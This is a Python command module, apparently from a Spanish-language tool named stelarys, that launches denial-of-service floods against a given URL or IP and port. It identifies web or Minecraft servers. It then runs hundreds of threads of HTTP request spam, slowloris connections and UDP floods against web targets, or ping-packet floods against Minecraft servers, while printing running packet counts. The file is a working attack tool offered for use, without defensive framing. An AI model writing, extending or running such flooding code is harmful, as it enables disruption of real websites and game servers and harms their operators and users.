from stelarys.src.utiles.imports import *


def detect_server_type(target):
    """Detecta qué tipo de servidor es"""
    if target.startswith("http"):
        return "web", extract_from_url(target)
    else:
        ip, port = target.split(":")
        port = int(port)
        if is_minecraft_server(ip, port):
            return "minecraft", (ip, port)
        else:
            return "generic", (ip, port)

def extract_from_url(url):
    parsed = urlparse(url)
    ip = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    return ip, port, path

def is_minecraft_server(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        s.send(b'\xFE\x01')
        response = s.recv(1024)
        s.close()
        return b'\xFF' in response[:10]  
    except:
        return False

def build_minecraft_packet():
    return b'\xFE\x01'

def build_web_request(ip, port, target_path):
    methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"]
    
    if target_path != "/":
        path = target_path + "?" + "".join(random.choices(string.ascii_letters + string.digits, k=100))
    else:
        paths = ["/", "xd"] # COLOCA RUTAS
        path = random.choice(paths) + "?" + "".join(random.choices(string.ascii_letters + string.digits, k=100))
    
    method = random.choice(methods)
    
    headers = [
        f"{method} {path} HTTP/1.1",
        f"Host: {ip}:{port}",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
        "Accept-Encoding: gzip, deflate",
        "Connection: keep-alive",
        "Upgrade-Insecure-Requests: 1"
    ]
    
    if method in ["POST", "PUT", "PATCH"]:
        body = "data=" + "A" * 5000 + "&" + "&".join([f"param{i}={'B'*100}" for i in range(10)])
        headers.extend([
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}"
        ])
        return ("\r\n".join(headers) + "\r\n\r\n" + body).encode()
    
    return ("\r\n".join(headers) + "\r\n\r\n").encode()

def attack_web(ip, port, path, threads=1000):
    sent = 0
    lock = threading.Lock()
    atacando = True
    
    print("")
    print(f"         {GRAY}({R}#{GRAY}) {W}Atacando WEB/API {G}{ip}:{port}{path}\n")
    print("")
    
    def http_spam():
        nonlocal sent
        while atacando:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(0.3)
                s.connect((ip, port))
                
                # Spam de requests
                for _ in range(50): 
                    if not atacando:
                        break
                    request = build_web_request(ip, port, path)
                    s.send(request)
                
                s.close()
                with lock:
                    sent += 50
            except:
                pass
    
    def slowloris():
        nonlocal sent
        while atacando:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((ip, port))
                
                
                s.send(f"GET {path} HTTP/1.1\r\nHost: {ip}:{port}\r\n".encode())
                
               
                for i in range(200):
                    if not atacando:
                        break
                    s.send(f"X-header-{i}: {'A'*50}\r\n".encode())
                    time.sleep(0.01)
                
                s.close()
                with lock:
                    sent += 200
            except:
                pass
    
    def udp_spam():
       
        nonlocal sent
        payload = b'GET ' + path.encode() + b' HTTP/1.1\r\n' + b'A' * 1400
        while atacando:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(200):
                    if not atacando:
                        break
                    s.sendto(payload, (ip, port))
                s.close()
                with lock:
                    sent += 200
            except:
                pass
    
    def show_stats():
        while atacando:
            time.sleep(1)
            with lock:
                print(f"          {GRAY}({G}#{GRAY}) {W}Paquetes enviados: {R}{sent} {G}{ip}:{port}{path}")
    
    
    for _ in range(threads // 2):  
        threading.Thread(target=http_spam, daemon=True).start()
    
    for _ in range(threads // 4):  
        threading.Thread(target=slowloris, daemon=True).start()
    
    for _ in range(threads // 4): 
        threading.Thread(target=udp_spam, daemon=True).start()
    
    threading.Thread(target=show_stats, daemon=True).start()
    
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        atacando = False
        print(f"\n         {GRAY}({G}✓{GRAY}) {W}Ataque de paquetes detenido. Total: {G}{sent}")

def attack_minecraft(ip, port, threads=800):
    sent = 0
    lock = threading.Lock()
    atacando = True
    
    print(f"        {GRAY}({LR}#{GRAY}) Atacando servidor de minecraft {G}{ip}:{port}]\n")
    
    def mc_flood():
        nonlocal sent
        while atacando:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((ip, port))
                
                for _ in range(100):
                    s.send(build_minecraft_packet())
                
                s.close()
                with lock:
                    sent += 100
            except:
                pass
    
    def show_stats():
        while atacando:
            time.sleep(1)
            with lock:
                print(f"          {GRAY}({G}#{GRAY}) Paquetes MC enviados {R}{sent} {G}{ip}:{port}]")
    
    for _ in range(threads):
        threading.Thread(target=mc_flood, daemon=True).start()
    
    threading.Thread(target=show_stats, daemon=True).start()
    
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        atacando = False
        print(f"\n{GRAY}({G}✓{GRAY} {W}Ataque MC detenido Total: {G}{sent}")

class denegarCommand:
    def run(self, args):
        if len(args) < 1:
            return
        
        target = args[0]
        
        try:
            server_type, server_info = detect_server_type(target)
            
            if server_type == "web":
                ip, port, path = server_info
                print("")
                print(f"       {GRAY}({G}#{GRAY}) {W}Detectado: Servidor WEB/API]")
                attack_web(ip, port, path)
                
            elif server_type == "minecraft":
                ip, port = server_info
                print("")
                print(f"       {GRAY}({G}#{GRAY}) {W}Detectado: Servidor Minecraft")
                attack_minecraft(ip, port)
                
            else:
                ip, port = server_info
                print("")
                print( f"       {GRAY}({G}#{GRAY}) {W} Servidor generico - usando ataque web")
                attack_web(ip, port, "/")
                
        except Exception as e:
            print("Formato correcto: http://ip:puerto/path o ip:puerto")